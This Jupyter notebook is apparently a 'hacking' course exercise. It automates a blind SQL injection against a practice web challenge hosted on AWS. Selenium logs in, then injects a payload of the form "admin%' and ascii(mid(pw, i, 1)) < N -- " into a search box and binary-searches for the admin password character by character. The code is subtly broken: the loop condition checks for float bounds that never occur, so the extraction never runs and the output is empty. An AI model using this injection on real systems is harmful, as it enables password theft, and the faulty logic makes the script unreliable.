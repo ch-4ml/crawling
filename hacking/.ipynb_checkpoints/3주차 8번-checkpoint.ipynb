{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 필요한 라이브러리 import\n",
    "from selenium import webdriver\n",
    "from bs4 import BeautifulSoup\n",
    "import pandas as pd\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver = webdriver.Chrome('./chromedriver')\n",
    "driver.get('http://ec2-54-180-137-70.ap-northeast-2.compute.amazonaws.com:8089/')\n",
    "\n",
    "elem_login = driver.find_element_by_name('mailaddr')\n",
    "elem_login.clear()\n",
    "elem_login.send_keys('fetch@ajou.ac.kr')\n",
    "xpath = '//*[@id=\"main\"]/form/table/tbody/tr[3]/td/input'\n",
    "driver.find_element_by_xpath(xpath).click()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "driver.get('http://ec2-54-180-137-70.ap-northeast-2.compute.amazonaws.com:8089/q/lv8.php')\n",
    "\n",
    "index = 20  # 비밀번호 최대 글자 수\n",
    "code = 128  # ASCII 코드 표\n",
    "password = ''\n",
    "for i in range(1, index + 1):\n",
    "    c_max = code\n",
    "    c_min = 0\n",
    "    while type(c_max) == float or type(c_min) == float:\n",
    "        c_mid = (c_max + c_min) // 2\n",
    "        key = \"admin%' and ascii(mid(pw, \" + str(i) + \", 1)) < \" + str(c_mid) + \" -- \"\n",
    "        \n",
    "        elem_id = driver.find_element_by_name('search')\n",
    "        elem_id.clear()\n",
    "        elem_id.send_keys(key)\n",
    "        xpath = '/html/body/form[1]/input[2]'\n",
    "        driver.find_element_by_xpath(xpath).click()\n",
    "        time.sleep(0.5)\n",
    "\n",
    "        html = driver.page_source\n",
    "        soup = BeautifulSoup(html, 'html.parser')\n",
    "        h = soup.select('body')[0].text\n",
    "\n",
    "        if 'admin*' in h:\n",
    "            c_max = c_mid\n",
    "        else:\n",
    "            c_min = c_mid\n",
    "\n",
    "    if type(c_max) == float:\n",
    "        password += chr(c_min)\n",
    "    else:\n",
    "        password += chr(c_max)\n",
    "    \n",
    "    print(password)\n",
    "print(password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
